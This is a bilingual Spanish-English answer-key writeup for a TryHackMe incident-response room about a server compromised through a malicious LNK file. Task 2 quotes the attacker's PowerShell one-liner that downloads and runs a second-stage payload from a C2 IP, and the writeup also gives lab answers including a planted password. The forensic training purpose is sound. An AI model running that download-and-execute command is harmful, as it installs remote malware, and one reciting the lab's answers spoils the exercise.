# APT28 in the Snare [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** Walkthrough (Premium)
* **Slug:** `apt28inthesnare`
* **Link:** https://tryhackme.com/room/apt28inthesnare
* **Sección / Section:** SOC / Threat Intelligence
* **Fuente / Source:** Writeup de thmrevenant (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Análisis de incidente de seguridad que implica investigar un servidor comprometido por el grupo APT28, incluyendo análisis de malware, persistencia y robo de credenciales.
> **EN:** Security incident analysis involving investigation of a server compromised by the APT28 group, including malware analysis, persistence, and credential theft.

---

### Task 1 — Host Information and Initial Compromise

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the name of the compromised host? | `Dev-QA-Server` |
| What TCP ports, excluding dynamic ports, are open on the host? (Ascending order) | `135, 445, 3389, 5985` |
| What user accounts are configured on this host? (Full names, alphabetical order) | `Bob Martin, DFIR Analyst, Tom Barry` |
| What type of file system does the compromised host use? | `NTFS` |
| What is the time zone of the compromised host? | `UTC` |
| What is the name of the archive that Tom downloaded to the server? | `Service_Configuration_Guide.rar` |
| What file was contained within the archive? | `Service_Configuration.txt.lnk` |
| What is the SHA256 hash of this malicious LNK file? | `e8b644b8ab35424adee7788003e8feca33a95a46238463978d74587d5ea147d1` |
| What is the URL from which this archive was downloaded? | `https://file.io/VCvdoR2TuyA3` |

---

### Task 2 — Malware Analysis and Execution

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What command was executed by the malicious LNK file? | `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-BitsTransfer -Source 'http://54.163.75.95:8085/Teams.exe' -Destination 'C:\Teams.exe'; Start-Process 'C:\Teams.exe'"` |
| What is the IP address of the C2 server from which the second-stage malware was downloaded? | `54.163.75.95` |
| Which service was utilised to download second-stage malware? | `BitsTransfer` |
| Which malicious file was downloaded using the command in the LNK file? | `C:\Teams.exe` |
| When did Teams.exe establish a connection to the C2 server? | `2024-12-07 15:23:04` |
| What do we suspect Teams.exe is? | `reverse shell` |

---

### Task 3 — Post-Exploitation Activities

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What discovery commands did the threat actor execute on the server after gaining access? Format: In order of time executed. | `whoami, ipconfig, systeminfo` |
| What registry path did the attacker use to establish persistence? | `HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\SqdyeRrWHEonQlT` |
| What file will be executed from the persistence mechanism established by the attacker? | `C:\Users\TOMBAR~1\AppData\Local\Temp\default.exe` |
| What is the MITRE ID associated with this type of persistence? | `T1547` |

---

### Task 4 — Privilege Escalation and Lateral Movement

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the name of the first service that the attacker created to escalate privileges? | `MEjwWODscHvM` |
| What executable did this malicious service run? | `C:\Users\TOMBAR~1\AppData\Local\Temp\ZJBDfQkGXS.exe` |
| To which privilege level did the attacker successfully escalate? | `SYSTEM` |
| Through which port does the executable file from the service establish a connection to the Command and Control server? | `1876` |
| Which command did the attacker use to check which users are in the admin group after escalating his privileges? | `net localgroup Administrators` |

---

### Task 5 — Credential Dumping and Data Exfiltration

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What process did the attacker access to dump user passwords from the system? | `lsass.exe` |
| What was the name of the file containing AWS credentials that the attacker is believed to have stolen from the server? | `AWSCredentials.txt` |
| What password is stored in this credential file? | `Fgnmusid!23` |

---

## Metodología / Methodology

1. **Paso 1 / Step 1:** Investigar el servidor comprometido identificando puertos abiertos, cuentas de usuario y sistema de archivos.
2. **Paso 2 / Step 2:** Analizar el vector de compromiso inicial: archivo RAR descargado que contenía un archivo LNK malicioso.
3. **Paso 3 / Step 3:** Examinar el malware ejecutado por el archivo LNK, incluyendo la descarga de second-stage malware y conexión al C2.
4. **Paso 4 / Step 4:** Identificar técnicas de persistencia (registry Run keys) y escalada de privilegios (creación de servicios maliciosos).
5. **Paso 5 / Step 5:** Investigar la actividad de post-explotación: volcado de credenciales con lsass.exe y robo de credenciales AWS.

### Cadena de ataque / Attack Chain

```
Descarga de archivo RAR → Ejecución de archivo LNK → PowerShell BitsTransfer → Descarga de Teams.exe → Conexión C2 → Enumeración → Persistencia Registry → Escalada SYSTEM → Volcado Credenciales → Robo AWS
```

**Lección:** Los atacantes utilizan técnicas de ingeniería social (archivos RAR con LNK malicioso) seguidas de múltiples capas de persistencia y escalada para alcanzar sus objetivos.

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
